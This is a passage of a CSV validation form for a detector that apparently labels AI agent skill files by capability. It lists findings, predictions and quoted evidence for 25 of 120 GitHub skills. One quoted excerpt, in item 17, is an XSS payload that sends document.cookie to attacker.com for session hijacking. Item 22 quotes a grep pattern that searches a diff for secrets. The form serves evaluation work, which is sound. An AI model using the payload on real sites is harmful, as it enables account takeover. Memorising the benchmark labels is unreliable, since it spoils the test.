@@ -1,0 +1,1222 @@
+SkillGuard | 120-skill validation form,,,,,,,,,,
+Item #,GitHub URL,My Findings (provisional),SkillGuard Prediction,Agreement (provisional),Ambiguity / Notes,Evidence / Notes (candidate excerpts),Dataset SHA,Reuse group,False positives,False negatives
+1,https://github.com/etendosoftware/etendo_schema_forge/blob/HEAD/.agents/skills/testing-delivery-gate/SKILL.md,"CMD, FS",None,No agreement,"CMD: L22 is conditional/example-like; distinguish available capability from mandatory action. | Provisional FP: None; FN: CMD, FS","CMD (Yes): L18: Before applying this gate, identify and validate the git repository that is being delivered.
+L20: 1. Detect the repository root for the delivery with `git rev-parse --show-toplevel` from the changed area.
+L22: 3. If more than one git repository has relevant changes, or if the requested delivery target is ambiguous, ask the owner to confirm which repository is being delivered before judging completion.
+NET (No): No supporting excerpt identified.
+FS (Yes): L23: 4. Read the confirmed repository's delivery instructions (`AGENTS.md`, `AGENTS.md`, package/module docs, or equivalent) and use them to decide the required validation commands.
+L47: 1. Find a nearby test matching the behavior or regression.
+CRED (No): No supporting excerpt identified.
+INST (No): No supporting excerpt identified.
+SCRIPT (No): No supporting excerpt identified.",000009fe40ffb92ccb4350995d114f838be78237,reused,None,"CMD, FS"
+2,https://github.com/obot-platform/obot/blob/HEAD/.claude/skills/draft-release-blog/SKILL.md,"CMD, NET, FS, SCRIPT","CMD, SCRIPT",Partial agreement,"CMD: L146 contains a restriction; keyword matching may mistake prohibited behavior for required behavior. NET: L146 contains a restriction; keyword matching may mistake prohibited behavior for required behavior. INST: L124 is a candidate despite the No label; inspect whether it is a mention or an actionable instruction. SCRIPT: L159 candidate; distinguish bundled helper invocation from generic or external scripts. Compare recorded prediction (CMD, SCRIPT) with provisional findings (CMD, NET, FS, SCRIPT); disagreement is not proof of detector error. | Provisional FP: None; FN: NET, FS","CMD (Yes): L146: End the turn there. Do not run any publish/upload commands. Do not modify the GitHub release. Do not commit anything to the repo.
+L187: - Run `grep -nF $'\xe2\x80\x94' /tmp/release-blog-<VERSION>.md` (or `grep -nF $'—'`) to confirm no em dashes slipped in. The hard constraints forbid them; the markdown editor sometimes auto-substitutes when copy-pasting.
+L60: - Re-read the PR(s) and any linked issues (remember: this repo does NOT use `closes #N`, so grep PR body/comments for issue numbers; see the related memory). The design discussions, alternatives considered, and user-reported problems live here.
+NET (Yes): L146: End the turn there. Do not run any publish/upload commands. Do not modify the GitHub release. Do not commit anything to the repo.
+L18: - https://obot.ai/blog/obot-v0210-network-egress-control-for-mcp-servers/ — single-feature deep-dive shape, first-person personal voice, ~600 words
+L19: - https://obot.ai/blog/announcing-obot-mcp-platform-v0-16-0-api-keys-model-access-policies-and-other-enterprise-ready-controls/ — multi-feature roundup shape, ""we are excited"" framing, ~1200 words
+FS (Yes): L140: Write the post to `/tmp/release-blog-<VERSION>.md`. Print:
+L5: description: Draft a release announcement blog post for an obot release, modeled on the existing obot.ai blog voice. Use when the user asks to draft a release blog, write a launch post, or write a blog announcement for a vX.Y.0 release. Outputs a markdown file the user can paste into the CMS. Can al
+L36: Confirm with the user which release the blog is for. Then find the canonical feature list:
+CRED (No): No supporting excerpt identified.
+INST (No): L124: - End with a CTA. Reference posts use either `reach out at info@obot.ai` or `Check out our installation guide`. Default to `info@obot.ai` for deep-dives where there's a partner/conversation angle, installation guide for roundups.
+SCRIPT (Yes): L159: uv run ""$CLAUDE_PROJECT_DIR/.claude/skills/draft-release-blog/md_to_html.py"" \",00000f2a9d8359900f2075b536b435ca9473a5b9,singleton,None,"NET, FS"
+3,https://github.com/Klotzkette/claude-fuer-deutsches-recht/blob/HEAD/fachanwalt-gewerblicher-rechtsschutz/skills/fachanwalt-gewerblicher-rechtsschutz-uwg-einstweilige-verfuegung/SKILL.md,NET,None,No agreement,NET: L97 describes an advertisement/website/email in a template; this alone does not establish external communication. Existing Yes may be overinclusive. NET: L97 candidate; distinguish remote operation from URL/reference or local command. | Provisional FP: None; FN: NET,"CMD (No): No supporting excerpt identified.
+NET (Yes): L97: [DETAILLIERTE BESCHREIBUNG: Werbeanzeige/Website/Email vom TT.MM.JJJJ, Inhalt,
+FS (No): No supporting excerpt identified.
+CRED (No): No supporting excerpt identified.
+INST (No): No supporting excerpt identified.
+SCRIPT (No): No supporting excerpt identified.",000011cf09114922342962431de29bea54807b28,singleton,None,NET
+4,https://github.com/OTOJulian/oto-hybrid-framework/blob/HEAD/oto/skills/writing-skills/SKILL.md,"CMD, FS","CMD, SCRIPT",Partial agreement,"SCRIPT: L320–323 explicitly describes running render-graphs.js in the skill directory; existing No label may be a validation error. NET: L634 conditional push may also warrant Yes. CMD: L634 is conditional/example-like; distinguish available capability from mandatory action. NET: L634 is conditional/example-like; distinguish available capability from mandatory action. SCRIPT: L320 is a candidate despite the No label; inspect whether it is a mention or an actionable instruction. Compare recorded prediction (CMD, SCRIPT) with provisional findings (CMD, FS); disagreement is not proof of detector error. | Provisional FP: SCRIPT; FN: FS","CMD (Yes): L148: **Purpose:** Claude reads description to decide which skills to load for a given task. Make it answer: ""Should I read this skill right now?""
+L634: - [ ] Commit skill to git and push to your fork (if configured)
+L26: A **skill** is a reference guide for proven techniques, patterns, or tools. Skills help future Claude instances find and apply effective approaches.
+NET (No): L634: - [ ] Commit skill to git and push to your fork (if configured)
+L72: API docs, syntax guides, tool documentation (office docs)
+L87: 1. **Heavy reference** (100+ lines) - API docs, comprehensive syntax
+FS (Yes): L577: step2 [label=""read file""];
+L26: A **skill** is a reference guide for proven techniques, patterns, or tools. Skills help future Claude instances find and apply effective approaches.
+L45: | **Refactor cycle** | Find new rationalizations ? plug ? re-verify |
+CRED (No): No supporting excerpt identified.
+INST (No): No supporting excerpt identified.
+SCRIPT (No): L320: **Visualizing for your human partner:** Use `render-graphs.js` in this directory to render a skill's flowcharts to SVG:
+L322: ./render-graphs.js ../some-skill           # Each diagram separately
+L323: ./render-graphs.js ../some-skill --combine # All diagrams in one SVG",000015349a0cc3fe71d881963d9a151363efd447,singleton,SCRIPT,FS
+5,https://github.com/okfriansyah-moh/crypto-sniping-bot/blob/HEAD/.github/skills/token-lifecycle/SKILL.md,None,None,Exact agreement,L1: source: okfriansyah-moh/crypto-sniping-bot/.github/skills/token-lifecycle/SKILL.md — contextual reference or example may be mistaken for operational capability; inspect surrounding instructions. | Provisional FP: None; FN: None,"CMD (No): No supporting excerpt identified.
+NET (No): No supporting excerpt identified.
+FS (No): No supporting excerpt identified.
+CRED (No): No supporting excerpt identified.
+INST (No): No supporting excerpt identified.
+SCRIPT (No): No supporting excerpt identified.",00001617447cc026a1fca766e1b8413ad94af12c,singleton,None,None
+6,https://github.com/frankyxhl/trinity/blob/HEAD/SKILL.md,"CMD, NET, FS, INST, SCRIPT","CMD, FS, INST, SCRIPT",Partial agreement,"INST: L25 candidate; distinguish installation from prerequisites or ordinary execution. SCRIPT: L34 candidate; distinguish bundled helper invocation from generic or external scripts. Compare recorded prediction (CMD, FS, INST, SCRIPT) with provisional findings (CMD, NET, FS, INST, SCRIPT); disagreement is not proof of detector error. | Provisional FP: None; FN: NET","CMD (Yes): L25: echo ""trinity: python3 not found. Install: brew install python3""
+L34: echo ""Run: make install (from trinity/ repo) or: cp -r trinity/scripts/. ~/.claude/skills/trinity/scripts/""
+L354: 2. Try Homebrew: `brew search <provider>` ? formula found ? `brew install <formula>` ? on failure fall through
+NET (Yes): No supporting excerpt identified.
+FS (Yes): L91: 1. Load `~/.claude/trinity.json` ? `providers`, `presets`, and `preset_aliases` (global)
+L92: 2. Load `.claude/trinity.json` ? project overlay; project entries win on conflict
+L201: Read your instructions from ~/.claude/agents/trinity-{base}.md first.
+CRED (No): No supporting excerpt identified.
+INST (Yes): L25: echo ""trinity: python3 not found. Install: brew install python3""
+L34: echo ""Run: make install (from trinity/ repo) or: cp -r trinity/scripts/. ~/.claude/skills/trinity/scripts/""
+L52: /trinity install <provider>                      # install + register provider
+SCRIPT (Yes): L34: echo ""Run: make install (from trinity/ repo) or: cp -r trinity/scripts/. ~/.claude/skills/trinity/scripts/""
+L279: Codex       ?? possibly stalled  +0 lines  [6m 05s]   Read: auth.py (line 45-80)
+L295: - At warn_at: `?? GLM:auth review ?? 6 ????? <4 ???— ????: Read auth.py (2 ???)`",000016393a7c8a729a5553e1904d06c2433934f7,singleton,None,NET
+7,https://github.com/jukeyman/jukeyman-skills/blob/HEAD/skills/saas-packs--navan-pack--navan-migration-deep-dive/SKILL.md,"CMD, NET, CRED","CMD, NET, CRED",Exact agreement,"NET: L65 candidate; distinguish remote operation from URL/reference or local command. CRED: L71 candidate; distinguish real secret retrieval/use from placeholders or configuration guidance. INST: L196 is a candidate despite the No label; inspect whether it is a mention or an actionable instruction. Compare recorded prediction (CMD, NET, CRED) with provisional findings (CMD, NET, CRED); disagreement is not proof of detector error. | Provisional FP: None; FN: None","CMD (Yes): L65: TOKEN=$(curl -s -X POST ""https://api.navan.com/ta-auth/oauth/token"" \
+L71: curl -s -H ""Authorization: Bearer $TOKEN"" \
+L104: curl -s -H ""Authorization: Bearer $TOKEN"" \
+NET (Yes): L65: TOKEN=$(curl -s -X POST ""https://api.navan.com/ta-auth/oauth/token"" \
+L174: TOKEN=$(curl -s -X POST ""https://api.navan.com/ta-auth/oauth/token"" \
+L38: | User profiles | Concur user export (CSV) | SCIM provisioning or `/get_users` API | IdP-driven |
+FS (No): No supporting excerpt identified.
+CRED (Yes): L71: curl -s -H ""Authorization: Bearer $TOKEN"" \
+L104: curl -s -H ""Authorization: Bearer $TOKEN"" \
+L180: USERS=$(curl -s -H ""Authorization: Bearer $TOKEN"" \
+INST (No): L196: - Use `navan-install-auth` to set up OAuth credentials for the migration
+SCRIPT (No): No supporting excerpt identified.",0000298ae650d634180ad1b1ca38539b1e51def6,singleton,None,None
+8,https://github.com/Nodman/conveyor/blob/HEAD/plugin/skills/executing-tasks/SKILL.md,"CMD, NET, FS, SCRIPT",None,No agreement,"NET: L52 candidate; distinguish remote operation from URL/reference or local command. SCRIPT: L79 candidate; distinguish bundled helper invocation from generic or external scripts. | Provisional FP: None; FN: CMD, NET, FS, SCRIPT","CMD (Yes): L23: rounds; deps + test baseline recorded in the ledger; `git -C <path>`/
+L25: pass, `git worktree remove` it before the merge.
+L52: `git -c user.name=<agent-name> -c user.email=codex@conveyor.invalid commit`
+NET (Yes): L52: `git -c user.name=<agent-name> -c user.email=codex@conveyor.invalid commit`
+L71: gate is the one deep read per PR). Then push. Codex lane: codex already
+L74: body becomes the squash commit — write it for the git log. After ANY push
+FS (Yes): L29: 1. Load `plugin/skills/routing/SKILL.md` first; pick the model per its
+CRED (No): No supporting excerpt identified.
+INST (No): No supporting excerpt identified.
+SCRIPT (Yes): L79: runs **pr-reviewer**; a codex gate runs via `codex-exec.sh run` and
+L11: Board state via `${CLAUDE_PLUGIN_ROOT}/scripts/card.sh`; config
+L16: - Board task: `card.sh move <issue> inProgress` the moment you start.",000032866d62d49e5abab2754e4a58dc8fd95910,singleton,None,"CMD, NET, FS, SCRIPT"
+9,https://github.com/rolandknight/voice-chatbot/blob/HEAD/skills/spotify/stop_spotify/SKILL.md,None,None,Exact agreement,No specific ambiguity documented; absence of evidence does not establish absence of capability. | Provisional FP: None; FN: None,"CMD (No): No supporting excerpt identified.
+NET (No): No supporting excerpt identified.
+FS (No): No supporting excerpt identified.
+CRED (No): No supporting excerpt identified.
+INST (No): No supporting excerpt identified.
+SCRIPT (No): No supporting excerpt identified.",00003315878f3b0ec8082abfe529d8c3f8ce3e80,singleton,None,None
+10,https://github.com/diegosouzapw/awesome-omni-skill/blob/HEAD/skills/tools/release/SKILL.md,"CMD, NET, FS, SCRIPT","CMD, SCRIPT",Partial agreement,"NET: L39 candidate; distinguish remote operation from URL/reference or local command. SCRIPT: L78 candidate; distinguish bundled helper invocation from generic or external scripts. Compare recorded prediction (CMD, SCRIPT) with provisional findings (CMD, NET, FS, SCRIPT); disagreement is not proof of detector error. | Provisional FP: None; FN: NET, FS","CMD (Yes): L5: description: Create a release following Git Flow strategy. Use when preparing a release, bumping version, creating release branch, or when user says ""release"", ""bump version"", ""prepare release"", ""ship version"".
+L11: This skill guides the release process following Git Flow with automated CI/CD.
+L38: git checkout develop
+NET (Yes): L39: git pull origin develop
+L101: git push -u origin release/v{NEW_VERSION}
+L121: git pull origin develop
+FS (Yes): L40: git status
+L81: Or manually update `deno.json`:
+L84: # Edit deno.json version field
+CRED (No): No supporting excerpt identified.
+INST (No): No supporting excerpt identified.
+SCRIPT (Yes): L78: bash scripts/bump_version.sh
+L151: bash scripts/bump_version.sh",00003364786d9725bbf2e157cbf6b9ba09df1218,singleton,None,"NET, FS"
+11,https://github.com/cstrahan/claude-plugins/blob/HEAD/skills/shell/SKILL.md,"CMD, FS","CMD, NET, FS, INST",Partial agreement,"CMD: L265 is conditional/example-like; distinguish available capability from mandatory action. NET: L265 is conditional/example-like; distinguish available capability from mandatory action. FS: L396 contains a restriction; keyword matching may mistake prohibited behavior for required behavior. INST: L384 is a candidate despite the No label; inspect whether it is a mention or an actionable instruction. | Provisional FP: NET, INST; FN: None","CMD (Yes): L20: In practice, assume zsh on macOS — it's been the default since Catalina (10.15). Write commands that work under both bash and zsh.
+L254: | `^` | Zsh extended glob negation, or history substitution at line start | `git rebase -i abc1234^` ? ""no matches found"" |
+L265: curl https://example.com/api?page=1&limit=10
+NET (No): L265: curl https://example.com/api?page=1&limit=10
+L268: curl 'https://example.com/api?page=1&limit=10'
+L252: | `?` | Single-char glob (bash AND zsh) | `echo https://example.com?param=value` ? ""no matches found"" |
+FS (Yes): L396: This is why the `GIT_SEQUENCE_EDITOR` temp scripts in the git-interactive-rebase skill use `#!/bin/bash` — the outer shell may be zsh, but the inner script runs in bash where `cat > ""$1""` works without noclobber issues.
+L35: The `>` operator refuses to overwrite existing files, and in zsh (not bash), the `>>` operator refuses to create new files.
+L87: cat > ""$TMPFILE"" << 'EOF'
+CRED (No): No supporting excerpt identified.
+INST (No): L384: This is particularly dangerous for commands that use glob-like syntax for non-file purposes (e.g., `pip install package[extra]`). In zsh, quote these to prevent glob interpretation: `pip install 'package[extra]'`.
+SCRIPT (No): No supporting excerpt identified.",0000349d6813df7a9c5c0b20c9244abe5b720bff,singleton,"NET, INST",None
+12,https://github.com/twhsi/skills/blob/HEAD/skills/fantastical-calendar/SKILL.md,"CMD, FS, SCRIPT","CMD, SCRIPT",Partial agreement,FS: L66 is conditional/example-like; distinguish available capability from mandatory action. SCRIPT: L28 candidate; distinguish bundled helper invocation from generic or external scripts. | Provisional FP: None; FN: FS,"CMD (Yes): L50: python3 scripts/fantastical_parse.py ""Deep work on 2026-06-19 from 09:00 to 11:00"" --dry-run
+L16: ```bash
+L17: python3 scripts/fantastical_parse.py ""Project review on 2026-06-19 at 10:00"" --notes ""Prep deck before the call""
+NET (No): No supporting excerpt identified.
+FS (Yes): L66: Read `references/fantastical-macos.md` only when debugging the app integration, updating the script, or adapting it to another Fantastical version.
+CRED (No): No supporting excerpt identified.
+INST (No): No supporting excerpt identified.
+SCRIPT (Yes): L28: 5. Run `scripts/fantastical_parse.py` from this skill folder.
+L50: python3 scripts/fantastical_parse.py ""Deep work on 2026-06-19 from 09:00 to 11:00"" --dry-run
+L14: Prefer the bundled script over ad hoc AppleScript:",000045638fec436c9c39ac0dcbbdeae670675e4f,singleton,None,FS
+13,https://github.com/RipeMangoBox/BITE/blob/HEAD/.claude/skills/reviewer-stress-test/SKILL.md,NET,None,No agreement,L32: 2. **On-demand web checks**: search web only for high-risk or uncertain claims (for example novelty/SOTA/parallel work). — contextual reference or example may be mistaken for operational capability; inspect surrounding instructions. | Provisional FP: None; FN: NET,"CMD (No): No supporting excerpt identified.
+NET (Yes): No supporting excerpt identified.
+FS (No): No supporting excerpt identified.
+CRED (No): No supporting excerpt identified.
+INST (No): No supporting excerpt identified.
+SCRIPT (No): No supporting excerpt identified.",000047b30d7bfb69101be83f61a6dd9ca83798ac,singleton,None,NET
+14,https://github.com/Construct-AI-primary/agent-companies-core/blob/HEAD/skills/learningforge-ai/skills/learningforge-ai-curriculum-design/SKILL.md,FS,None,No agreement,No specific ambiguity documented; absence of evidence does not establish absence of capability. | Provisional FP: None; FN: FS,"CMD (No): No supporting excerpt identified.
+NET (No): No supporting excerpt identified.
+FS (Yes): No supporting excerpt identified.
+CRED (No): No supporting excerpt identified.
+INST (No): No supporting excerpt identified.
+SCRIPT (No): No supporting excerpt identified.",000050a706b4f628641f2990ede1a4424c3bcbb2,reused,None,FS
+15,https://github.com/terrylica/cc-skills/blob/HEAD/plugins/kokoro-tts/skills/server/SKILL.md,"CMD, FS, INST, SCRIPT","CMD, NET, FS, INST, SCRIPT",Partial agreement,NET: L48 is a candidate despite the No label; inspect whether it is a mention or an actionable instruction. FS: L79 is conditional/example-like; distinguish available capability from mandatory action. INST: L69 candidate; distinguish installation from prerequisites or ordinary execution. SCRIPT: L28 candidate; distinguish bundled helper invocation from generic or external scripts. | Provisional FP: NET; FN: None,"CMD (Yes): L28: ~/.local/share/kokoro/.venv/bin/python ~/.local/share/kokoro/tts_server.py
+L48: curl -s http://127.0.0.1:8779/health | python3 -m json.tool
+L27: ```bash
+NET (No): L48: curl -s http://127.0.0.1:8779/health | python3 -m json.tool
+FS (Yes): L79: 3. **Was a workaround needed?** — If you had to improvise (different flags, extra steps), update this SKILL.md so the next invocation doesn't need the same workaround.
+CRED (No): No supporting excerpt identified.
+INST (Yes): L69: | Model load fails    | Not installed          | Run `/kokoro-tts:install` first            |
+SCRIPT (Yes): L28: ~/.local/share/kokoro/.venv/bin/python ~/.local/share/kokoro/tts_server.py",00005476ec717a3124826e19a2527b7e7ecd3b44,singleton,NET,None
+16,https://github.com/fvnju/noteey/blob/HEAD/.agents/skills/auth0-quickstart/SKILL.md,"CMD, NET, FS, CRED, INST","CMD, NET, INST",Partial agreement,"NET: L60 candidate; distinguish remote operation from URL/reference or local command. CRED: L60 candidate; distinguish real secret retrieval/use from placeholders or configuration guidance. INST: L19 candidate; distinguish installation from prerequisites or ordinary execution. SCRIPT: L39 is a candidate despite the No label; inspect whether it is a mention or an actionable instruction. | Provisional FP: None; FN: FS, CRED","CMD (Yes): L36: **Run this command to identify your framework:**
+L72: brew install auth0/auth0-cli/auth0
+L38: ```bash
+NET (Yes): L60: | Node.js API | `""express-oauth2-jwt-bearer""` in package.json | `express-oauth2-jwt-bearer` |
+L149: - **`express-oauth2-jwt-bearer`** - Node.js/Express API JWT Bearer validation
+L163: - [FastAPI (Python)](https://auth0.com/docs/quickstart/backend/python)
+FS (Yes): L40: cat package.json | grep -E ""react|next|vue|nuxt|angular|express|fastify|@nestjs|expo""
+L123: auth0 apps list          # Find your app
+L195: - [Vite, Create React App, Angular](references/environments.md#single-page-applications-spas)
+CRED (Yes): L60: | Node.js API | `""express-oauth2-jwt-bearer""` in package.json | `express-oauth2-jwt-bearer` |
+L149: - **`express-oauth2-jwt-bearer`** - Node.js/Express API JWT Bearer validation
+L246: - `express-oauth2-jwt-bearer` - Node.js/Express API JWT Bearer validation
+INST (Yes): L19: install:
+L24: label: 'Install Auth0 CLI (brew)'
+L68: ### Install Auth0 CLI
+SCRIPT (No): L39: # Check package.json dependencies (Node.js projects)
+L60: | Node.js API | `""express-oauth2-jwt-bearer""` in package.json | `express-oauth2-jwt-bearer` |
+L149: - **`express-oauth2-jwt-bearer`** - Node.js/Express API JWT Bearer validation",0000570c3d0c78531c1006a20eeabcf2ada98b12,singleton,None,"FS, CRED"
+17,https://github.com/bpnrockstar/UnifiedBugHunter/blob/HEAD/skills/web2-vuln-classes/SKILL.md,"CMD, NET, FS, CRED, SCRIPT","CMD, NET, FS, SCRIPT",Partial agreement,NET: L55 candidate; distinguish remote operation from URL/reference or local command. CRED: L14 candidate; distinguish real secret retrieval/use from placeholders or configuration guidance. SCRIPT: L357 candidate; distinguish bundled helper invocation from generic or external scripts. | Provisional FP: None; FN: CRED,"CMD (Yes): L325: # Python parallel
+L357: grep -rn ""execute\|executemany\|raw("" --include=""*.py"" | grep -v ""?""
+L117: ### DOM XSS Sinks (grep for these)
+NET (Yes): L55: - **V7:** GraphQL node — `{ node(id: ""base64(User:456)"") { email } }`
+L450: - **Undici** — Node.js built-in Fetch/FormData parser (used for `Next-Action` header RSC requests)
+L36: @app.route('/api/orders/<order_id>')
+FS (Yes): L30: > **Needs two sessions** (A=attacker, B=victim) — load both via `--auth-file`
+CRED (Yes): L14: > .private/T.json` or `--cookie/--bearer` flags — every recon/scan tool then
+L113: Input: ""<script>document.location='https://attacker.com/c?c='+document.cookie</script>""
+L114: Any user viewing page executes attacker JS ? cookie theft ? session hijack
+INST (No): No supporting excerpt identified.
+SCRIPT (Yes): L357: grep -rn ""execute\|executemany\|raw("" --include=""*.py"" | grep -v ""?""
+L446: ### Busboy / Undici Multipart Parser Internals (Node.js / Next.js)
+L450: - **Undici** — Node.js built-in Fetch/FormData parser (used for `Next-Action` header RSC requests)",000071155a19641bc46d1592420f2c78e6f0a658,singleton,None,CRED
+18,https://github.com/diegosouzapw/awesome-omni-skill/blob/HEAD/skills/data-ai/deep-research-thepexcel/SKILL.md,"CMD, NET, FS","CMD, NET, FS",Exact agreement,CMD: L191 is conditional/example-like; distinguish available capability from mandatory action. NET: L191 is conditional/example-like; distinguish available capability from mandatory action. FS: L237 is conditional/example-like; distinguish available capability from mandatory action. SCRIPT: L93 is a candidate despite the No label; inspect whether it is a mention or an actionable instruction. | Provisional FP: None; FN: None,"CMD (Yes): L91: | **A** | Single fact | WebSearch ? Answer | ""Python 3.13 release date ?????????????"" |
+L191: curl -s --max-time 60 ""https://r.jina.ai/https://example.com""
+L203: mkdir -p /mnt/d/githubresearch && cd /mnt/d/githubresearch && git clone [repo-url]
+NET (Yes): L91: | **A** | Single fact | WebSearch ? Answer | ""Python 3.13 release date ?????????????"" |
+L191: curl -s --max-time 60 ""https://r.jina.ai/https://example.com""
+L24: WebSearch: ""[topic] landscape overview [current year]""
+FS (Yes): L203: mkdir -p /mnt/d/githubresearch && cd /mnt/d/githubresearch && git clone [repo-url]
+L229: After completing research, **ALWAYS save to markdown file**:
+L237: - Create `research/` folder if it doesn't exist
+CRED (No): No supporting excerpt identified.
+INST (No): No supporting excerpt identified.
+SCRIPT (No): L93: | **C** | Judgment needed | Full 6 phases | ""?????? Next.js ???? Astro ?????? blog?"" |
+L121: | **C1** (Key claim) | Quote + 2+ sources + confidence | ""Next.js ?? market share 42%"" |
+L122: | **C2** (Supporting) | Citation required | ""Vercel ???????????? Next.js"" |",00009a13ac1585155030c88723c6661610031a56,singleton,None,None
+19,https://github.com/znlgis/opengis-skills/blob/HEAD/cad/openscad/SKILL.md,"CMD, FS, INST","CMD, NET, INST",Partial agreement,NET: L9 is a candidate despite the No label; inspect whether it is a mention or an actionable instruction. INST: L36 candidate; distinguish installation from prerequisites or ordinary execution. | Provisional FP: NET; FN: FS,"CMD (Yes): L38: brew install --cask openscad
+L242: - **cadquery** — Python ??? CAD?BREP ???????????[../cadquery/SKILL.md](../cadquery/SKILL.md)
+L243: - **freecad** — ????? CAD?? GUI + Python ???[../freecad/SKILL.md](../freecad/SKILL.md)
+NET (No): L9: > **?????** <https://github.com/openscad/openscad>
+L11: > **???** <https://openscad.org/>
+L13: > **?????** <https://openscad.org/documentation.html>
+FS (Yes): No supporting excerpt identified.
+CRED (No): No supporting excerpt identified.
+INST (Yes): L36: sudo apt install openscad
+L38: brew install --cask openscad
+SCRIPT (No): No supporting excerpt identified.",0000a9e8d6f00cd038046e5edfdb78256c7b5ac7,singleton,NET,FS
+20,https://github.com/atman-33/atman-marketplace/blob/HEAD/plugins/stack-react-router/skills/react-router-v7-app/SKILL.md,FS,CMD,No agreement,CMD: L68 is a candidate despite the No label; inspect whether it is a mention or an actionable instruction. | Provisional FP: CMD; FN: FS,"CMD (No): L68: ```sh
+L103: ```sh
+L122: ```sh
+NET (No): No supporting excerpt identified.
+FS (Yes): No supporting excerpt identified.
+CRED (No): No supporting excerpt identified.
+INST (No): No supporting excerpt identified.
+SCRIPT (No): No supporting excerpt identified.",0000abfa65579c478ea2be9bb1c608576c8108d8,singleton,CMD,FS
+21,https://github.com/MikeCheng1208/BattleTree/blob/HEAD/.agents/skills/overseer-plan/SKILL.md,"CMD, FS",None,No agreement,"NET: L102 is a candidate despite the No label; inspect whether it is a mention or an actionable instruction. | Provisional FP: None; FN: CMD, FS","CMD (Yes): No supporting excerpt identified.
+NET (No): L102: | Understanding API | @file references/api.md |
+L110: | `references/api.md` | Overseer MCP codemode API types/methods |
+FS (Yes): No supporting excerpt identified.
+CRED (No): No supporting excerpt identified.
+INST (No): No supporting excerpt identified.
+SCRIPT (No): No supporting excerpt identified.",0000acbe72917ea47293198e6f6a529cdda60603,reused,None,"CMD, FS"
+22,https://github.com/ngpestelos/skills/blob/HEAD/github-code-review/SKILL.md,"CMD, FS","CMD, NET, CRED",Partial agreement,"NET: L11 is a candidate despite the No label; inspect whether it is a mention or an actionable instruction. CRED: L21 is a candidate despite the No label; inspect whether it is a mention or an actionable instruction. SCRIPT: L123 is a candidate despite the No label; inspect whether it is a mention or an actionable instruction. | Provisional FP: NET, CRED; FN: FS","CMD (Yes): L39: git diff --staged                  # what would be committed
+L40: git diff main...HEAD               # full PR contents
+L41: git diff main...HEAD --name-only   # file list
+NET (No): L11: tags: [GitHub, Code-Review, Pull-Requests, Git, Quality]
+L17: Review local changes pre-push, or open PRs on GitHub. Most operations are pure `git`; the `gh`/`curl` split only matters for PR-level interactions. Output template at `references/review-output-template.md`.
+L34: Pure `git` — no API needed.
+FS (Yes): L39: git diff --staged                  # what would be committed
+L40: git diff main...HEAD               # full PR contents
+L41: git diff main...HEAD --name-only   # file list
+CRED (No): L21: The `curl` fallbacks below read `$GITHUB_TOKEN`, `$GH_OWNER`, `$GH_REPO`. Derive them from `gh` (pure-`gh` users can skip the exports — only the `curl` examples need them):
+L56: git diff main...HEAD | grep -in ""password\|secret\|api_key\|token.*=\|private_key""
+L79: curl -s -H ""Authorization: token $GITHUB_TOKEN"" \
+INST (No): No supporting excerpt identified.
+SCRIPT (No): L123: -f path=""src/auth/login.py"" \
+L151: {\""path\"": \""src/auth.py\"", \""line\"": 45, \""body\"": \""?? Critical: SQL injection — use parameterized queries.\""},
+L152: {\""path\"": \""src/models.py\"", \""line\"": 23, \""body\"": \""?? Warning: hash passwords with bcrypt before storing.\""},",0000b457e388df103b65fc64f88eeb8b1b554aa8,singleton,"NET, CRED",FS
+23,https://github.com/kickthemoon0817/simul/blob/HEAD/skills/isaac-scripting/SKILL.md,"CMD, NET, SCRIPT",None,No agreement,"NET: L5 candidate; distinguish remote operation from URL/reference or local command. | Provisional FP: None; FN: CMD, NET, SCRIPT","CMD (Yes): L5: description: This skill should be used when the user asks to ""execute a script in Isaac Sim"", ""run Python in Isaac"", ""write a custom Isaac Sim script"", ""use the omni API"", ""use the pxr API"", ""use the isaacsim API"", ""execute_isaac_script"", or needs to perform operations not covered by the granular MC
+L34: Scripts are sent over TCP to port **8226** (the stock `isaacsim.code_editor.vscode` extension). The executor runs your code with `compile()` inside Kit's Python process, giving full access to the global namespace including `omni.*`, `pxr.*`, and `isaacsim.*`.
+NET (Yes): L5: description: This skill should be used when the user asks to ""execute a script in Isaac Sim"", ""run Python in Isaac"", ""write a custom Isaac Sim script"", ""use the omni API"", ""use the pxr API"", ""use the isaacsim API"", ""execute_isaac_script"", or needs to perform operations not covered by the granular MC
+L34: Scripts are sent over TCP to port **8226** (the stock `isaacsim.code_editor.vscode` extension). The executor runs your code with `compile()` inside Kit's Python process, giving full access to the global namespace including `omni.*`, `pxr.*`, and `isaacsim.*`.
+L27: - The required API is not exposed by any granular tool (e.g. creating lights, querying rigid body velocities, custom material shaders, bounding box computations, raycasting)
+FS (No): No supporting excerpt identified.
+CRED (No): No supporting excerpt identified.
+INST (No): No supporting excerpt identified.
+SCRIPT (Yes): No supporting excerpt identified.",0000bb34d56e7651b71fde16aa7d57be528514af,singleton,None,"CMD, NET, SCRIPT"
+24,https://github.com/enchantednatures/.dotfiles/blob/HEAD/.config/opencode/skills/context-persistence/SKILL.md,"CMD, NET, SCRIPT",CMD,Partial agreement,"NET: L86 candidate; distinguish remote operation from URL/reference or local command. FS: L181 is a candidate despite the No label; inspect whether it is a mention or an actionable instruction. | Provisional FP: None; FN: NET, SCRIPT","CMD (Yes): L496: **Solution:** Context is version controlled - check git history
+L498: git log --oneline .ai-dlc/
+L499: git show HEAD:.ai-dlc/context.json
+NET (Yes): L86: ""topic"": ""API Design"",
+L112: ""api"": ""REST with OpenAPI"",
+L478: ### Context API
+FS (No): L181: 1. Read .ai-dlc/context.json
+L204: **Update Files:**
+CRED (No): No supporting excerpt identified.
+INST (No): No supporting excerpt identified.
+SCRIPT (Yes): No supporting excerpt identified.",0000c5c7566573f1c4b432200fda627d3dab317b,singleton,None,"NET, SCRIPT"
+25,https://github.com/samkhawase/magictales/blob/HEAD/magictales/.codex/skills/gsd-map-codebase/SKILL.md,"CMD, FS",None,No agreement,"FS: L37 contains a restriction; keyword matching may mistake prohibited behavior for required behavior. INST: L53 is a candidate despite the No label; inspect whether it is a mention or an actionable instruction. | Provisional FP: None; FN: CMD, FS","CMD (Yes): L61: Codex `spawn_agent` does not create or bind a git worktree automatically.
+NET (No): No supporting excerpt identified.
+FS (Yes): L59: - `fork_context: false` by default — GSD agents load their own context via `<files_to_read>` blocks
+L37: - Do NOT write workflow artifacts (CONTEXT.md, DISCUSSION-LOG.md, PLAN.md, checkpoint files) until the user has answered the plain-text questions or one of (a)-(c) above applies. Surfacing the questions and waiting is the correct response — silently defaulting and writing artifacts is the #3018 fail
+L149: 2. Create .planning/codebase/ directory structure
+CRED (No): No supporting excerpt identified.
